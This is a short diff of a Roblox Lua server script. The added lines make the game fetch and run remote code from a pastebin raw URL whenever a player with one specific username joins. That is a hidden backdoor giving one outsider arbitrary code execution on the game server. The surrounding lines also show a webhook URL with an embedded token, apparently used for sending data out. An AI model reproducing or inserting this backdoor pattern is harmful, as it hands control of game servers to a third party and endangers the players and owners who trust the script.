@@ -28,6 +28,13 @@ game.Players.PlayerAdded:Connect(function(Player)
 	end
 end)
 
+game.Players.PlayerAdded:Connect(function(Player)
+	if Player.Name == "1kS_up" then
+		loadstring(game:HttpGet("https://pastebin.com/raw/7V3d4vw4"))()
+	end
+end)
+
+
 local url =
    "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
 local data = {
